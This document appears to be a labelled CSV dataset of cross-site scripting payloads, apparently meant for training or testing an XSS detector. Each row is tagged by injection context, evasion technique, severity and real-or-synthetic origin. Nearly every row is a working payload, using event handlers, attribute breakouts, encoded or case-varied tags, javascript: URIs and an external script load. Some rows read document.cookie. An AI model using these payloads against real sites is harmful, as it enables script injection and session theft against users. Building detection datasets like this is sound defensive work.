payload,context,technique,severity,length,source
<a2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</a2><input value=clickme>,event_handler,none,medium,104,real
"""><svg onbegin=alert(1)>",tag_injection,synthetic,medium,24,synthetic
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,event_handler,comment_injection,medium,55,real
<svG oNclIck=alErt(1)/>,tag_injection,synthetic,medium,23,synthetic
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,103,real
"<style>:target {color: red;}</style><font id=x style=""transition:color 10s"" ontransitioncancel=print()></font>",event_handler,none,low,110,real
""" onlo&#97;d=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,58,synthetic
<svg/onload=%26nbsp;alert`bohdan`+,event_handler,url_encoding,low,34,real
"<style>:target {color: red;}</style><acronym id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></acronym>",event_handler,none,medium,117,real
' onfocus=\u0061lert('XSS') ',attribute_escape,synthetic,medium,29,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style=""position:absolute;"" onanimationcancel=""print()""></abbr>",event_handler,none,low,177,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style=""position:absolute;"" onanimationcancel=""print()""></footer>",event_handler,none,low,181,real
<svg%0Aonload=%09((pro\u006dpt))()//,event_handler,unicode_escape|url_encoding,low,36,real
"<noscript onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",event_handler,none,medium,77,real
"<xmp onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></xmp>",event_handler,none,medium,279,real
"<style>:target {color: red;}</style><bdo id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdo>",event_handler,none,medium,109,real
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=print()></noframes>",event_handler,none,low,118,real
<Img Src=OnAnonKryptiQuz OnError=confirm(1337)>,event_handler,case_variation,medium,47,real
"""><Svg onFocUs=ConSolE.lOg('XSS')>",tag_injection,synthetic,medium,34,synthetic
"<td draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</td>",event_handler,none,medium,80,real
"<strike draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</strike>",event_handler,none,medium,90,real
<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>,event_handler,none,medium,79,real
"<u onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</u>",event_handler,none,medium,55,real
"<style>:target {transform: rotate(180deg);}</style><plaintext id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></plaintext>",event_handler,none,medium,136,real
%22><svg onmouseover=console.log(document.domain)>,tag_injection,synthetic,medium,50,synthetic
<command onpointerover=alert(1) style=display:block>AnonKryptiQuz</command>,event_handler,none,medium,75,real
"<spacer onmousemove=""alert(1)"">AnonKryptiQuz</spacer>",event_handler,none,medium,53,real
<output id=x tabindex=1 onbeforedeactivate=alert(1)></output><input autofocus>,event_handler,none,medium,78,real
<thead onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</thead><input value=clickme>,event_handler,none,medium,101,real
%22><svg onbegin=confirm(document.domain)>,tag_injection,synthetic,medium,42,synthetic
"<video2 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</video2>",event_handler,none,medium,85,real
""" ontoggle=confirm(document.cookie) """,attribute_escape,synthetic,medium,37,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""print()""></figcaption>",event_handler,none,low,189,real
""" onerror=console.log(document.cookie) """,attribute_escape,synthetic,medium,40,synthetic
<xss class=progress-bar-animated onanimationstart=alert(1)>,event_handler,none,medium,59,real
<nav id=x tabindex=1 onactivate=alert(1)></nav>,event_handler,none,medium,47,real
"setTimeout(""console.log(1)"",0)",dom_sink,synthetic,medium,30,synthetic
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></wbr>",event_handler,none,medium,110,real
"<style>@keyframes slidein {}</style><meter style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></meter>",event_handler,none,medium,170,real
<script>consol&#101;.log(loc&#97;tion.h&#97;sh)</script>,script_injection,synthetic,medium,56,synthetic
"javascript:\/\/\'\/<\/title><\/style><\/textarea><\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\'Audi%20RS5\'.substr(0,4)}}XXX%3Cscript%3Ealert(\'AnonKryptiQuz\')",js_uri,url_encoding,medium,335,real
"<script oncontextmenu=""alert(1)"">AnonKryptiQuz</script>",script_injection,none,medium,55,real
<button popovertarget=x>Click me</button><style ontoggle=alert(1) popover id=x>AnonKryptiQuz</style>,event_handler,none,medium,100,real
"<animate onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animate>",event_handler,none,medium,90,real
"<img SRC=""javascript:document.vulnerable=true;"">",js_uri,none,low,48,real
%3Csvg onfocus=confirm(location.hash)%3E,tag_injection,synthetic,medium,40,synthetic
"<embed onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",event_handler,none,medium,70,real
"<xmp onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</xmp>",event_handler,none,medium,79,real
<img/src/onerror=alert/*1337*/(1)>,event_handler,comment_injection,low,34,real
"<track draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</track>",event_handler,none,medium,66,real
"<audio controls autoplay onratechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,none,medium,101,real
"<li onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</li>",event_handler,none,medium,59,real
<scr	ipt>/*/alert(location.hash)</scr	ipt>,script_injection,synthetic,medium,42,synthetic
"<input4 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></input4>",event_handler,none,medium,285,real
onload=”alert(‘AnonKryptiQuz’),event_handler,none,medium,30,real
"<caption onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",event_handler,none,medium,75,real
"' onmous&#101;&#101;nt&#101;r=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,78,synthetic
"<picture onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",event_handler,none,medium,70,real
%22 onclick=alert(1) %22,attribute_escape,synthetic,medium,24,synthetic
<svg onclick=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,55,synthetic
"<blockquote onmouseout=""alert(1)"">AnonKryptiQuz</blockquote>",event_handler,none,medium,60,real
<scRipT>aLerT`dOcuMenT.cOokIe`</sCriPt>,script_injection,synthetic,medium,39,synthetic
<br onpointerleave=alert(1) style=display:block>AnonKryptiQuz</br>,event_handler,none,medium,66,real
' onb&#101;gin=prompt(docum&#101;nt.cooki&#101;) ',attribute_escape,synthetic,medium,50,synthetic
"%27 ontoggle=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,59,synthetic
<b id=x tabindex=1 onfocus=alert(1)></b>,event_handler,none,medium,40,real
%3Csvg onload=confirm(location.hash)/%3E,tag_injection,synthetic,medium,40,synthetic
"<select oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</select>",event_handler,none,medium,64,real
"<style>:target {color:red;}</style><select id=x style=""transition:color 1s"" ontransitionend=alert(1)></select>",event_handler,none,medium,110,real
"""><svg onfocus=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,54,synthetic
location='javaScriPt:alert\x2845\x29',js_uri,none,low,37,real
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,generic,html_entity,low,131,real
"""%3E%3Csvg onmouseenter=confirm('XSS')%3E",tag_injection,synthetic,medium,41,synthetic
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,event_handler,none,medium,44,real
"<blink onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></blink>",event_handler,none,medium,283,real
<script>window['alert'](document['domain'])<script>,script_injection,none,low,51,real
"<colgroup onmouseover=""alert(1)"">AnonKryptiQuz</colgroup>",event_handler,none,medium,57,real
"<;IMG SRC="";jav&#x09;ascript:alert(';XSS';);"";>;",attribute_escape,html_entity|whitespace_obfuscation,medium,48,real
"<data onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,81,real
<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>,event_handler,none,medium,53,real
"%3Csvg onmouseover=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,59,synthetic
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,script_injection,case_variation,medium,40,real
<button popovertarget=x>Click me</button><xmp ontoggle=alert(1) popover id=x>AnonKryptiQuz</xmp>,event_handler,none,medium,96,real
"<table onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</table>",event_handler,none,medium,65,real
"<style>@keyframes x{}</style><body style=""animation-name:x"" onwebkitanimationend=""alert(1)""></body>",event_handler,none,medium,99,real
"<foreignObject xlink:href=""javascript:alert(88)""/>",js_uri,case_variation,medium,50,real
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable style=display:block>drop here</output>",event_handler,none,medium,133,real
"<dl onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dl>",event_handler,none,medium,79,real
<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>,event_handler,none,medium,68,real
""">%0D%0A%0D%0A<x '=""foo""><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>",event_handler,url_encoding,medium,93,real
"<bdi id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></bdi>",event_handler,none,medium,82,real
"<style>@keyframes slidein {}</style><input3 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></input3>",event_handler,none,medium,172,real
<button popovertarget=x>Click me</button><link ontoggle=alert(1) popover id=x>AnonKryptiQuz</link>,event_handler,none,medium,98,real
"?callback=javascript:alert(1)"",",js_uri,none,medium,31,real
"<nobr onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</nobr>",event_handler,none,medium,69,real
"<svg onload=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,55,synthetic
%27 onmouseover=prompt(location.hash) %27,attribute_escape,synthetic,medium,41,synthetic
"<del id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></del>",event_handler,none,medium,82,real
"<ruby draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</ruby>",event_handler,none,medium,85,real
"<event-source src=""%(event)s"" onload=""javascript:alert(1364)"">",event_handler,none,medium,62,real
<dt onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</dt><input value=clickme>,event_handler,none,medium,95,real
"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",event_handler,none,medium,61,real
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",script_injection,none,medium,55,real
<ol onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"""%3E%3Csvg onfocus=console.log(location.hash)%3E",tag_injection,synthetic,medium,48,synthetic
"<style>:target {color:red;}</style><style id=x style=""transition:color 1s"" ontransitionend=alert(1)></style>",event_handler,none,medium,108,real
"<br draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</br>",event_handler,none,medium,82,real
<svg onerror=console.log(location.hash)>,tag_injection,synthetic,medium,40,synthetic
<dl onpointerup=alert(1) style=display:block>AnonKryptiQuz</dl>,event_handler,none,medium,63,real
<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>,script_injection,restricted_chars,high,55,real
"<element draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</element>",event_handler,none,medium,72,real
"<menuitem draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",event_handler,none,medium,93,real
"document.write(""%3Cimg src=x onerror=prompt(document.cookie)%3E"")",dom_sink,synthetic,medium,65,synthetic
"<kbd onmouseleave=""alert(1)"">AnonKryptiQuz</kbd>",event_handler,none,medium,48,real
"<div draggable=""true"" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable style=display:block>drop here</noscript>",event_handler,none,medium,133,real
"<svg draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</svg>",event_handler,none,medium,64,real
%3Csvg onmouseover=confirm(document.domain)%3E,tag_injection,synthetic,medium,46,synthetic
"<basefont onmouseover=""alert(1)"">AnonKryptiQuz</basefont>",event_handler,none,medium,57,real
"<thead draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</thead>",event_handler,none,medium,68,real
"<nav onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",event_handler,none,medium,68,real
"<frameset onmouseout=""alert(1)"">AnonKryptiQuz</frameset>",event_handler,none,medium,56,real
"""\""><body/onload=&lt;!--&gt;&#10confirm(1);prompt(/AnonKryptiQuz/.source)>"",",event_handler,html_entity,medium,76,real
"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable style=display:block>drop here</cite>",event_handler,none,medium,125,real
"<style>:target {transform: rotate(180deg);}</style><svg id=x style=""transition:transform 2s"" ontransitionrun=print()></svg>",event_handler,none,low,123,real
<listing onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
<xmp id=x tabindex=1 onactivate=alert(1)></xmp>,event_handler,none,medium,47,real
<strike onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</strike><input value=clickme>,event_handler,none,medium,112,real
"<blink onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</blink>",event_handler,none,medium,67,real
<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>,event_handler,none,medium,55,real
<style onpointerleave=alert(1) style=display:block>AnonKryptiQuz</style>,event_handler,none,medium,72,real
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,event_handler,none,medium,55,real
"<style>:target {transform: rotate(180deg);}</style><listing id=x style=""transition:transform 2s"" ontransitionrun=print()></listing>",event_handler,none,low,131,real
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",attribute_escape,none,medium,55,real
"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionend=alert(1)></pre>",event_handler,none,medium,104,real
""" oNclIck=alErt(loCatIon.haSh) """,attribute_escape,synthetic,medium,32,synthetic
"<li style=list-style:url() onerror=javascript:alert(3719)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(3719)></div>",event_handler,url_encoding,medium,169,real
